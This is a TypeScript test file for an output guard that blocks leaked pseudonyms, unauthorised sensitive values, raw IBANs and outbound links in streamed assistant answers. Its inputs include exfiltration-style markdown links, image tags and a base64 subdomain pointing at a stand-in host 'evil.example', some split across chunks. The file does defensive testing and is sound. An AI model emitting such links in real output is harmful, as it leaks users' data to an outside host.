import { describe, expect, it } from "vitest";
import { Pseudonymizer, SENSITIVE_DUTY } from "../src/domain/redaction.js";
import type { GuardContext } from "../src/runtime/egressGuard.js";
import { createChunkReleaser, createOutputGuard, stripUnreadableCitations, UNVERIFIED_MARK, type OutputInput } from "../src/runtime/outputGuard.js";

const IBAN = "DE89370400440532013000";
const HOLDER = new Set([SENSITIVE_DUTY.payroll]);

function turn(over: Partial<OutputInput> = {}, context: Partial<GuardContext> = {}): OutputInput {
  const pseudo = new Pseudonymizer("t", 60_000, () => 0);
  pseudo.redact("salary: 85000 and a@x.io");
  return {
    tenantId: "t",
    text: "",
    context: { inputTokens: new Set(["[PAY-1]", "[EMAIL-1]"]), inputRecordIds: new Set(["INV-7"]), highestClass: "P0", ...context },
    pseudo,
    duties: new Set(),
    declaredClass: "P0",
    ...over,
  };
}

const reasonOf = async (text: string, over: Partial<OutputInput> = {}, context: Partial<GuardContext> = {}) => {
  const verdict = await createOutputGuard().check(turn({ text, ...over }, context));
  return verdict.ok ? undefined : verdict.reason;
};

describe("output guard checks", () => {
  it("passes tokens and record ids that belong to this turn", async () => {
    expect(await reasonOf("Pay [PAY-1] to [EMAIL-1], see [[cite:INV-7]].")).toBeUndefined();
  });

  it("suppresses a token or a record id that is not in this turn's inputs (another user's or tenant's)", async () => {
    expect(await reasonOf("Write to [EMAIL-2].")).toBe("TOKEN_NOT_IN_INPUT");
    expect(await reasonOf("Open [IBAN-1].")).toBe("TOKEN_NOT_IN_INPUT");
    expect(await reasonOf("See [[cite:INV-99]].")).toBe("RECORD_NOT_IN_INPUT");
    expect(await reasonOf("See [[cite:]].")).toBe("RECORD_NOT_IN_INPUT");
  });

  it("allows up to 20 percent unverified citations and suppresses above it", async () => {
    const own = "[[cite:INV-7]] ".repeat(4);
    expect(await reasonOf(`${own}[[cite:INV-99]].`)).toBeUndefined();
    expect(await reasonOf(`${own}[[cite:INV-98]] [[cite:INV-99]].`)).toBe("RECORD_NOT_IN_INPUT");
  });

  it("replaces a citation the user cannot read with the unverified mark and never keeps its id", () => {
    const shown = stripUnreadableCitations("A [[cite:INV-7]] B [[cite:SECRET-9]].", new Set(["INV-7"]));
    expect(shown).toBe(`A [[cite:INV-7]] B ${UNVERIFIED_MARK}.`);
    expect(shown).not.toContain("SECRET-9");
  });

  it("verifies the final text against the viewer's duties: a raw value they may not see is a leak, a held one is not", async () => {
    expect(await reasonOf("The pay is 85000.")).toBe("DUTY_LEAK");
    expect(await reasonOf("The pay is 85000.", { duties: HOLDER })).toBeUndefined();
    expect(await reasonOf("The pay is ****.")).toBeUndefined();
  });

  it("suppresses a raw identifier that did not come from allowed re-hydration", async () => {
    expect(await reasonOf(`Pay to ${IBAN}.`)).toBe("RAW_IDENTIFIER");
    expect(await reasonOf(`Pay to ${IBAN}.`, { duties: HOLDER })).toBe("RAW_IDENTIFIER");
    expect(await reasonOf("The salary: 85000.", { duties: HOLDER })).toBeUndefined();
  });

  it("removes every non-relative link, keeps a relative record link and logs only a count", async () => {
    const logs: unknown[][] = [];
    const guard = createOutputGuard({ log: (...args: unknown[]) => void logs.push(args) } as Parameters<typeof createOutputGuard>[0]);
    const verdict = await guard.check(turn({ text: "See [PO 123](/purchasing/purchase-orders/123), [site](https://evil.example/c?d=hello) and ![i](https://evil.example/i.png)." }));
    expect(verdict).toMatchObject({ ok: true, text: "See [PO 123](/purchasing/purchase-orders/123), site and .", linksRemoved: 2 });
    expect(JSON.stringify(logs)).not.toContain("evil.example");
    expect(JSON.stringify(logs)).toContain('"removed":2');
  });

  it("neutralises before it checks: a duty leak or token hidden by link syntax is still caught", async () => {
    expect(await reasonOf("Pay [85000](https://evil.example/x).")).toBe("DUTY_LEAK");
    expect(await reasonOf("<a href='https://evil.example'>85000</a>")).toBe("DUTY_LEAK");
    expect(await reasonOf("[[EMAIL-9]](https://evil.example/x)")).toBe("TOKEN_NOT_IN_INPUT");
    expect(await reasonOf("[a@x.io](/x)", { duties: HOLDER })).toBeUndefined();
  });

  it("returns only text that passed the checks, with no surviving disallowed link", async () => {
    const verdict = await createOutputGuard().check(turn({ text: "[x][1]\n[1]: //evil.example/a\n<img src=//evil.example/a> https://c2VjcmV0.evil.example/" }));
    expect(verdict).toMatchObject({ ok: true, text: "x\n\n [link removed]" });
  });

  it("re-neutralises after pseudonym restore so a restored value never lands in a link", () => {
    const pseudo = new Pseudonymizer("t", 60_000, () => 0);
    const token = pseudo.tokenize("AMOUNT", "/evil.example/x");
    const guarded = `[go](/${token})`;
    expect(pseudo.restoreFor(guarded, new Set())).toBe("[go](//evil.example/x)");
    expect(createOutputGuard().neutralise(pseudo.restoreFor(guarded, new Set()))).toBe("go");
  });

  it("refuses a proposal whose args carry a link and leaves a relative link in args alone", async () => {
    const guard = createOutputGuard();
    const check = (attachments: string) => guard.check(turn({ text: "ok", attachments }));
    expect(await check('{"memo":"[x](https://evil.example/c?d=1)"}')).toMatchObject({ ok: false, reason: "LINK_IN_ARGS" });
    expect(await check('{"memo":"[x](https://docs.example/guide)"}')).toMatchObject({ ok: false, reason: "LINK_IN_ARGS" });
    expect(await check('{"memo":"<img src=//evil.example/a>"}')).toMatchObject({ ok: false, reason: "LINK_IN_ARGS" });
    expect(await check('{"ref":"/purchasing/purchase-orders/123"}')).toMatchObject({ ok: true });
  });

  it("raises the class to the highest class of the inputs and never lowers it", async () => {
    const guard = createOutputGuard();
    expect(await guard.check(turn({ text: "ok" }, { highestClass: "P3" }))).toMatchObject({ ok: true, dataClass: "P3" });
    expect(await guard.check(turn({ text: "ok", declaredClass: "P3" }, { highestClass: "P1" }))).toMatchObject({ ok: true, dataClass: "P3" });
  });

  it("fails closed on a throwing analyzer and on a missed deadline, logging reasons and counts only", async () => {
    const logged: unknown[] = [];
    const log = (_level: string, _message: string, extra?: unknown) => void logged.push(extra);
    const thrown = await createOutputGuard({ log, analyzer: { scan: () => { throw new Error(`down ${IBAN}`); } } }).check(turn({ text: "ok" }));
    expect(thrown).toMatchObject({ ok: false, reason: "GUARD_ERROR" });
    const slow = await createOutputGuard({ log, deadlineMs: 20, analyzer: { scan: () => new Promise(() => undefined) } }).check(turn({ text: "ok" }));
    expect(slow).toMatchObject({ ok: false, reason: "GUARD_TIMEOUT" });
    expect(JSON.stringify(logged)).not.toContain(IBAN);
    expect(logged[0]).toMatchObject({ reason: "GUARD_ERROR", inputTokens: 2, inputRecordIds: 1 });
  });

  it("reports the decision and duration to the metric hook", async () => {
    const seen: string[] = [];
    const guard = createOutputGuard({ observe: (_s, decision) => void seen.push(decision) });
    await guard.check(turn({ text: "ok" }));
    await guard.check(turn({ text: "[EMAIL-7]" }));
    expect(seen).toEqual(["ALLOWED", "OUTPUT_BLOCKED"]);
  });
});

describe("streamed answers and the unverified-citation share", () => {
  const streamed = async (sentences: string[]) => {
    const guard = createOutputGuard();
    const releaser = createChunkReleaser(async (chunk) => (await guard.check(turn({ text: chunk, partial: true }))).ok);
    for (const s of sentences) releaser.push(s);
    const chunksPassed = await releaser.end();
    const final = await guard.check(turn({ text: sentences.join("") }));
    return { chunksPassed, final };
  };
  const own = "Invoice [[cite:INV-7]] is due. ";
  const owned = Array.from({ length: 5 }, () => own);

  it("does not withdraw per chunk: one unverified citation among six passes every chunk and the final check", async () => {
    const { chunksPassed, final } = await streamed([...owned, "Also [[cite:INV-99]] is odd. "]);
    expect(chunksPassed).toBe(true);
    expect(final.ok).toBe(true);
  });

  it("withdraws at the final check when two of six are unverified, though each chunk passed", async () => {
    const { chunksPassed, final } = await streamed([...owned.slice(0, 4), "Also [[cite:INV-98]] is odd. ", "And [[cite:INV-99]] too. "]);
    expect(chunksPassed).toBe(true);
    expect(final).toMatchObject({ ok: false, reason: "RECORD_NOT_IN_INPUT" });
  });

  it("still applies the other rules to a partial chunk", async () => {
    const verdict = await createOutputGuard().check(turn({ text: "Write to [EMAIL-9]. ", partial: true }));
    expect(verdict).toMatchObject({ ok: false, reason: "TOKEN_NOT_IN_INPUT" });
  });
});

describe("streaming never releases a link before it is complete", () => {
  const sunk = async (deltas: string[]) => {
    const guard = createOutputGuard();
    const released: string[] = [];
    const releaser = createChunkReleaser(async (chunk) => {
      const verdict = await guard.check(turn({ text: chunk, partial: true }));
      if (verdict.ok) released.push(verdict.text);
      return verdict.ok;
    });
    for (const d of deltas) releaser.push(d);
    await releaser.end();
    return released.join("");
  };

  it.each([
    ["a link split across 2 chunks", ["Go [see. here](https://evil", ".example/c?d=1) now."]],
    ["a link split across 3 chunks", ["Go [see. ", "here](https://evil.example", "/c?d=1) now."]],
    ["an image split right after the destination opener", ["Go ![a. b](", "https://evil.example/i.png) now."]],
    ["an html img split mid tag", ["Go <img src=\"https://evil.example/i.png. ", "x\" alt=y> now."]],
    ["a reference definition split from its label", ["Go [x][1]. \n[1]: //evil", ".example/c\nnow."]],
  ])("%s", async (_name, deltas) => {
    const shown = await sunk(deltas);
    expect(shown).not.toContain("evil");
    expect(shown).toContain("now.");
  });

  it("keeps a relative link split across chunks intact and flushes an unclosed tail at the end", async () => {
    expect(await sunk(["See [PO. 1](/purchasing/", "purchase-orders/1) ok. "])).toBe("See [PO. 1](/purchasing/purchase-orders/1) ok. ");
    expect(await sunk(["Tail [open"])).toBe("Tail [open");
  });
});

describe("chunk releaser", () => {
  const run = async (deltas: string[], allow: (chunk: string) => boolean = () => true) => {
    const released: string[] = [];
    const releaser = createChunkReleaser(async (chunk) => {
      if (!allow(chunk)) return false;
      released.push(chunk);
      return true;
    });
    for (const d of deltas) releaser.push(d);
    return { released, completed: await releaser.end() };
  };

  it("releases whole sentences in order, keeps a pseudonym split across deltas together and flushes the tail", async () => {
    const { released, completed } = await run(["Hello the [PA", "Y-1] value. Next", " is 1200.00 here! Tail"]);
    expect(released).toEqual(["Hello the [PAY-1] value. ", "Next is 1200.00 here! ", "Tail"]);
    expect(completed).toBe(true);
  });

  it("stops releasing after the first refused chunk", async () => {
    const { released, completed } = await run(["One. ", "Two. ", "Three. "], (chunk) => !chunk.startsWith("Two"));
    expect(released).toEqual(["One. "]);
    expect(completed).toBe(false);
  });
});
